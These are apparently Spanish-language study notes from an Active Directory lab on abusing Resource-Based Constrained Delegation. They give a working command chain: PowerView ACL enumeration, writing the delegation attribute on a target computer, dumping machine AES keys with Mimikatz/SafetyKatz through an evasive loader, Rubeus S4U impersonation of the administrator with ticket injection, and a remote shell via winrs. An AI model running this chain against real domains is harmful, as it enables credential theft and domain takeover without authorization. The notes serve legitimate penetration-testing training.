# Resourced-based Constrained Delegation

Tags: #AD #Constrained_Delegation 

- Esto transfiere la autoridad de delegación al administrador del recurso/servicio.
- En lugar de usar SPNs en **msDS-AllowedToDelegateTo** en el servicio frontal (como un servicio web), en este caso el acceso está controlado por el **descriptor de seguridad** del atributo **msDS-AllowedToActOnBehalfOfOtherIdentity** (visible como **PrincipalsAllowedToDelegateToAccount**) en el recurso/servicio, como por ejemplo un servicio de SQL Server.
- Es decir, el administrador del recurso/servicio puede configurar esta delegación, mientras que en otros tipos se requieren privilegios **SeEnableDelegation**, los cuales, por defecto, solo están disponibles para **Domain Admins**.

Para abusar de **RBCD (Resource-Based Constrained Delegation)** de la forma más efectiva, solo necesitamos dos privilegios:

1. **Permisos de escritura** ( GenericWrite o GenericAll) sobre el servicio u objeto objetivo para configurar el atributo **msDS-AllowedToActOnBehalfOfOtherIdentity**.
2. **Control sobre un objeto que tenga un SPN configurado** (por ejemplo, acceso administrativo a una máquina unida al dominio o la capacidad de unir una máquina al dominio — el valor por defecto de **ms-DS-MachineAccountQuota** es 10 para todos los usuarios del dominio).

```powershell 
! Usuario: Usuario de dominio

❯ Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
# Enumerar ACLs interesantes del dominio filtrando por un usuario específico — identifica sobre qué objetos tiene permisos de escritura para abusar de Resource-Based Constrained Delegation (RBCD).
```

```powershell 
! Usuario: Usuario de dominio con permisos de escritura sobre el objeto objetivo

❯ $comps = 'dcorp-student1$','dcorp-student2$'
❯ Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
# Configurar RBCD en el equipo objetivo — permite que las máquinas especificadas deleguen en su nombre para abusar de S4U2Proxy e impersonar usuarios.

❯ Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$' -Verbose
# Configurar RBCD en el equipo objetivo usando PowerView — permite que dcorp-student1$ delegue en su nombre para abusar de S4U2Proxy.

❯ Get-DomainRBCD
# Enumerar todos los objetos del dominio que tienen RBCD configurado — verifica que la configuración fue aplicada correctamente.

! Usuario: Administrador local de la máquina atacante
❯ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
# Extraer las claves AES de todas las cuentas en memoria — obtener la AES key de la cuenta de máquina para usarla en el ataque S4U.
```

```powershell 
! Usuario: Administrador local de la máquina configurada en RBCD

❯ Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
# Abusar de RBCD usando la AES key de la cuenta de máquina para impersonar al Administrator e inyectar el ticket en la sesión actual — permite acceso al equipo objetivo como cualquier usuario.

NOTA: Si existen múltiples entradas para el mismo username en sekurlsa::ekeys, usar el AES256 correspondiente al SID S-1-5-18 (SYSTEM) ya que es la cuenta de máquina real, no una sesión de usuario.


❯ winrs -r:dcorp-mgmt cmd.exe
# Abrir una shell remota en el equipo objetivo usando el ticket inyectado vía RBCD.
```
